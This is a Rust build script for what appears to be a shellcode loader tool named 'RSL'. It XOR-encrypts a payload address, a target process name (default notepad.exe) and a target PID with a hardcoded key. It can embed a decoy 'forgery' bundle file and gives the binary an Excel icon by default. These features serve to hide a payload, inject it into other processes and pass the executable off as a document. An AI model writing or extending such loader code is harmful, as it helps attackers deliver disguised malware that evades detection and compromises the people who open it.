extern crate embed_resource;
include!("src/thunk.rs");
use std::{env, fs};
use base64::{Engine as _, engine::general_purpose};

fn simple_encrypt(data: &[u8]) -> String {
    let key = b"rsl_secret_key_2025";
    let encrypted: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ key[i % key.len()]).collect();
    general_purpose::STANDARD.encode(&encrypted)
}

fn main() {
    // Environment variables to watch for changes
    let env_vars = [
        "CARGO_FEATURE_WIN7",
        "CARGO_FEATURE_WITH_FORGERY",
        "RSL_TARGET_PROGRAM",
        "RSL_TARGET_PID",
        "RSL_ICON_PATH",
        "RSL_BUNDLE_FILE",
        "RSL_BUNDLE_FILENAME",
        "RSL_DEFAULT_PAYLOAD_ADDRESS"
    ];

    for var in &env_vars {
        println!("cargo:rerun-if-env-changed={}", var);
    }

    // Set compile-time environment variable for bundle filename if with_forgery feature is enabled
    if env::var("CARGO_FEATURE_WITH_FORGERY").is_ok() {
        let bundle_filename = env::var("RSL_BUNDLE_FILENAME").unwrap_or_default();
        println!("cargo:rustc-env=RSL_BUNDLE_FILENAME={}", bundle_filename);
        copy_bundle_file();
    }

    // Encrypt default payload address if load_payload_cmdline feature is enabled
    if env::var("CARGO_FEATURE_LOAD_PAYLOAD_CMDLINE").is_ok() {
        let default_payload_address = env::var("RSL_DEFAULT_PAYLOAD_ADDRESS").unwrap_or_else(|_| "encrypt.bin".to_string());
        println!("cargo:rustc-env=RSL_ENCRYPTED_DEFAULT_PAYLOAD_ADDRESS={}", simple_encrypt(default_payload_address.as_bytes()));
    }

    // Encrypt target program if pattern2 feature is enabled
    if env::var("CARGO_FEATURE_PATTERN2").is_ok() {
        let target_program = env::var("RSL_TARGET_PROGRAM").unwrap_or_else(|_| r"notepad.exe".to_string());
        println!("cargo:rustc-env=RSL_ENCRYPTED_TARGET_PROGRAM={}", simple_encrypt(target_program.as_bytes()));
    }

    // Encrypt target PID if pattern3 feature is enabled
    if env::var("CARGO_FEATURE_PATTERN3").is_ok() {
        let target_pid = env::var("RSL_TARGET_PID").unwrap_or_else(|_| "0".to_string());
        println!("cargo:rustc-env=RSL_ENCRYPTED_TARGET_PID={}", simple_encrypt(target_pid.as_bytes()));
    }

    // Conditional compilation tasks
    if env::var("CARGO_FEATURE_WIN7").is_ok() {
        println!("cargo:note=Win7 Enabled, executing thunk");
        thunk();
    }
    generate_icon_rc();
    embed_resource::compile("icon.rc");
}


fn copy_bundle_file() {
    let bundle_file = env::var("RSL_BUNDLE_FILE").expect("RSL_BUNDLE_FILE environment variable must be set when using with_forgery feature");

    // Ensure absolute path
    let bundle_file = std::path::Path::new(&bundle_file);
    let bundle_file = if bundle_file.is_absolute() {
        bundle_file.to_path_buf()
    } else {
        std::env::current_dir().unwrap().join(bundle_file)
    };
    let bundle_file_str = bundle_file.to_str().unwrap();

    let content = format!("pub const MEMORY_FILE: &[u8] = include_bytes!(r\"{}\");\n", bundle_file_str);
    fs::write("src/forgery/bundle_data.rs", content).expect("Failed to write bundle_data.rs");

    println!("cargo:note=Generated bundle_data.rs with file: {}", bundle_file_str);
}

fn generate_icon_rc() {
    let icon_path = env::var("RSL_ICON_PATH")
        .unwrap_or_else(|_| "icons/excel.ico".to_string())
        .replace("\\", "/");

    let content = format!(r#"iconName ICON "{}""#, icon_path);
    fs::write("icon.rc", content).expect("Failed to write icon.rc");
    println!("cargo:note=Generated icon.rc with icon: {}", icon_path);
}